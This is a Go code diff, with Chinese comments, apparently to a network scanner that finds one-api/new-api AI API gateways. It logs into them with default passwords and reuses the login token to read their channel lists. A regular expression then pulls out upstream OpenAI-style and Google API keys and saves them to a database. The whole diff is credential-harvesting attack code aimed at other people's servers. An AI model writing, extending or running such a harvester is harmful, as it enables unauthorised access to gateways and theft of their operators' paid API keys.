@@ -18,6 +18,7 @@ import (
 	"io"
 	"net/http"
 	"net/url"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
@@ -89,6 +90,8 @@ type Scanner struct {
 	allowAuth bool
 	// scanClient 是本次扫描专用的 client（按 Options.Proxy 构造，空则与 client 相同）。
 	scanClient *http.Client
+	// lastGatewayToken 是最近一次网关默认口令登录成功的 token（读渠道用）。
+	lastGatewayToken string
 
 	mu      sync.Mutex
 	running bool
@@ -393,8 +396,19 @@ func (s *Scanner) probeHost(ctx context.Context, base string, t Target) bool {
 
 	// 默认口令探测（仅在显式开启时）：登录后读鉴权接口里的 key。
 	if s.allowAuth && budget > 0 {
-		if _, stop := s.tryDefaultAuth(ctx, base, assetID, matched.vendor, &budget); stop {
+		ok2, stop := s.tryDefaultAuth(ctx, base, assetID, matched.vendor, &budget)
+		if stop {
 			return true
+		}
+		// 网关命中（one-api/new-api）：渠道响应里的 key 字段走专用提取，
+		// 比通用正则准——直接对准 "key":"sk-..." 字段。
+		if ok2 && (matched.vendor == "one-api" || matched.vendor == "new-api") {
+			for _, p := range []string{"/api/channel/?p=0&page_size=100", "/api/channel/"} {
+				st, body2, _ := s.getWithAuth(ctx, base+p, s.lastGatewayToken)
+				if st == 200 && body2 != "" {
+					s.extractChannelKeys(base+p, assetID, body2)
+				}
+			}
 		}
 	}
 	return true
@@ -460,6 +474,25 @@ func (s *Scanner) harvestKeys(ctx context.Context, base string, assetID int64, b
 			}
 		}
 	}
+}
+
+// channelKeyRE 是 one-api/new-api 渠道列表 JSON 里 key 字段的专用提取：
+// "key":"sk-..."——比通用正则更准，直接对准上游凭据字段。
+var channelKeyRE = regexp.MustCompile(`"key"\s*:\s*"(sk-[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{35})"`)
+
+// extractChannelKeys 从渠道列表 JSON 里提取上游 key（one-api/new-api 专用）。
+func (s *Scanner) extractChannelKeys(src string, assetID int64, body string) int {
+	n := 0
+	for _, m := range channelKeyRE.FindAllStringSubmatch(body, 100) {
+		key := m[1]
+		if !looksLikeRealKey(key) {
+			continue
+		}
+		if ok, _ := s.pgKeyInsert(src+"#channel", "OpenAI", key, "gateway-channel"); ok {
+			n++
+		}
+	}
+	return n
 }
 
 // extractKeys 用正则扫响应体，命中即落库（只存原文+掩码，原文不外传）。
